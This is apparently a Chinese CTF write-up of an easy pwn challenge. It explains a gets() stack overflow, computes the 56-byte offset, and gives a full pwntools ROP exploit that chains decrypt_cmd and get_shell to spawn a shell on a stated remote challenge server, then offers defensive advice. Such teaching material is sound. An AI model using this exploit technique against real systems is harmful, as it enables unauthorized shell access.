## 引言

Pwn题是CTF中的经典题型，核心考察二进制漏洞利用能力。本题“checkin”作为入门级Pwn题，仅开启NX保护（栈不可执行），无Canary和PIE保护，漏洞点明确（`gets()`函数栈溢出），且提供了现成的后门函数，非常适合新手学习栈溢出和ROP链构造。本文将从漏洞分析、栈布局理解、ROP链设计到最终Exploit编写，完整拆解解题过程。

## 题目基础信息

### 1. 题目概况
- 题目名称：checkin
- 难度：Easy
- 核心考点：栈溢出漏洞利用、ROP链构造、函数调用链设计
- 保护机制：仅开启NX（No-eXecute，栈不可执行），无Canary（栈溢出保护）、无PIE（位置独立可执行）

### 2. 工具准备
- 反编译工具：IDA Pro（64位）
- 调试工具：GDB（配合pwndbg插件）
- 漏洞利用框架：pwntools（Python库）
- 靶机连接：远程服务器（IP：8.148.153.211，端口：30817）
   
## 漏洞分析

### 1. 程序逻辑拆解
使用IDA反编译程序，得到核心函数逻辑：

#### （1）main函数
```c
int main() {
    setvbuf(stdout, 0, 2, 0);  // 关闭缓冲区，实时输出
    setvbuf(stdin, 0, 2, 0);   // 关闭缓冲区，实时输入
    puts("Welcome. Try to hack me.");
    vulnerable();  // 调用存在漏洞的函数
    return 0;
}
```

#### （2）vulnerable函数（漏洞点）
```c
int64 vulnerable() {
    puts("Build your chain:");
    return gets();  // 危险函数：不检查输入长度，导致栈溢出
}
```

**漏洞核心**：`gets()`函数读取输入时不限制长度，当输入数据超过缓冲区大小时，会覆盖栈上的返回地址，从而控制程序执行流。

### 2. 后门函数分析
程序中存在两个关键后门函数，可直接用于获取shell：

#### （1）decrypt_cmd函数（命令解密）
```c
int decrypt_cmd() {
    puts("Decryption routine activated");
    for (int i = 0; i <= 7; ++i) {
        cmd[i] ^= key;  // 对全局变量cmd进行异或解密
    }
    return result;
}
```

#### （2）get_shell函数（执行系统命令）
```c
int get_shell() {
    return system(cmd);  // 执行解密后的cmd命令（如/bin/sh）
}
```

**关键发现**：
- `cmd`是全局变量，初始值为加密后的字符串（如`'m +,m1*B'`）；
- 需先调用`decrypt_cmd()`解密`cmd`，再调用`get_shell()`执行命令；
- 两个函数无需额外参数，可直接连续调用。

### 3. 关键地址提取
通过IDA获取函数和变量的虚拟地址（无PIE保护，地址固定）：
- `decrypt_cmd`函数地址：`0x401196`
- `get_shell`函数地址：`0x4011F2`
- `vulnerable`函数地址：`0x40120C`（用于验证栈布局）

## 栈布局与偏移量计算

### 1. 栈布局分析
在`vulnerable`函数中，栈布局如下（64位程序，栈按8字节对齐）：
```
高地址
|----------------|
|  返回地址（RA） |  8字节（待覆盖）
|----------------|
|  基址指针（rbp）|  8字节
|----------------|
|  缓冲区（var_30）|  48字节（0x30 = 48）
|----------------|
低地址
```

- 缓冲区大小：`var_30`表示栈上偏移`-0x30`，即缓冲区长度为48字节；
- 需覆盖的内容：缓冲区（48字节）+ rbp（8字节）= 56字节，之后的内容将覆盖返回地址。

### 2. 偏移量计算
偏移量 = 缓冲区大小 + rbp长度 = `0x30`（48） + `0x8`（8） = `0x38`（56字节）。

验证方法：通过GDB调试，发送56个'A'（填充缓冲区和rbp）+ 8个'B'（覆盖返回地址），运行后程序会因访问`0x4242424242424242`（B的ASCII码）崩溃，证明偏移量正确。

## ROP链构造与Exploit编写

### 1. ROP链设计思路
由于开启NX保护，无法直接执行栈上的shellcode，需利用现有函数构造ROP链，控制程序执行流：
1. 用56个'A'填充缓冲区和rbp；
2. 覆盖返回地址为`decrypt_cmd`函数地址，让程序执行解密；
3. `decrypt_cmd`执行完毕后，返回地址设为`get_shell`函数地址，继续执行命令；
4. `get_shell`调用`system(cmd)`，获取交互式shell。

ROP链结构：
```
payload = b'A'*56 + p64(decrypt_cmd_addr) + p64(get_shell_addr)
```

### 2. 完整Exploit代码
```python
from pwn import *

# 配置环境：指定目标二进制文件，日志级别为info
context.binary = './chal'
context.log_level = 'info'

# 连接远程靶机（本地测试可改为process('./chal')）
p = remote('8.148.153.211', 30817)

# 关键函数地址（从IDA中提取）
decrypt_cmd_addr = 0x401196
get_shell_addr = 0x4011F2
offset = 0x30 + 0x8  # 48字节缓冲区 + 8字节rbp = 56字节偏移

# 构造ROP链：填充偏移 + 解密函数地址 + 执行shell函数地址
payload = b'A' * offset  # 填充缓冲区和rbp
payload += p64(decrypt_cmd_addr)  # 第一步：解密cmd命令
payload += p64(get_shell_addr)    # 第二步：执行解密后的命令

# 发送payload（等待程序输出"Build your chain:"后发送）
p.sendlineafter(b"Build your chain:\n", payload)

# 获取交互式shell
p.interactive()
```

### 3. 执行流程详解
1. 程序运行至`vulnerable()`函数，调用`gets()`读取输入；
2. 输入的56个'A'填满缓冲区和rbp，之后的`decrypt_cmd`地址覆盖返回地址；
3. `vulnerable()`函数执行完毕，返回地址指向`decrypt_cmd`，程序开始解密`cmd`；
4. `decrypt_cmd`执行完毕后，栈顶存放的`get_shell`地址成为新的返回地址；
5. 程序跳转到`get_shell`，调用`system(cmd)`执行`/bin/sh`，获取shell；
6. 通过`p.interactive()`与靶机交互，执行`ls`、`cat flag`等命令获取flag。

## 技术要点与防御建议

### 1. 核心技术要点
#### （1）栈溢出漏洞利用
- 关键是找到不限制输入长度的危险函数（如`gets()`、`scanf("%s")`、`strcpy()`）；
- 准确计算偏移量是成功的前提，需结合IDA的栈布局和GDB调试验证。

#### （2）ROP链构造
- ROP（Return-Oriented Programming）：利用程序中已有的函数片段（gadget）或完整函数，构造执行链；
- 本题直接使用完整函数作为gadget，无需复杂的gadget查找，适合新手入门。

#### （3）NX保护绕过
- NX保护禁止执行栈上的代码，但允许通过ROP链调用程序中已有的可执行函数；
- 核心思路：“借力打力”，利用程序自身的函数完成攻击。

### 2. 防御建议
- **替换危险函数**：用`fgets()`（限制输入长度）替代`gets()`，用`snprintf()`替代`sprintf()`；
- **开启全保护机制**：启用Canary（栈溢出检测）、PIE（地址随机化）、RELRO（重定位只读）；
- **避免后门函数**：生产环境中禁止保留`system()`、`execve()`等可执行系统命令的后门；
- **输入长度检查**：对所有用户输入进行严格的长度和格式验证。

## 总结

本题作为入门级Pwn题，覆盖了栈溢出漏洞识别、偏移量计算、ROP链构造等核心知识点，且保护机制简单，非常适合新手入门。解题的关键在于：
1. 快速定位`gets()`函数带来的栈溢出漏洞；
2. 识别程序中提供的后门函数，理清调用顺序；
3. 准确计算偏移量，构造简洁的ROP链。

通过本题的练习，可掌握Pwn题的基本解题流程：漏洞分析→栈布局理解→偏移量计算→利用代码编写。后续可尝试更复杂的题目（如开启Canary、PIE保护，需要查找gadget的场景），逐步提升二进制漏洞利用能力。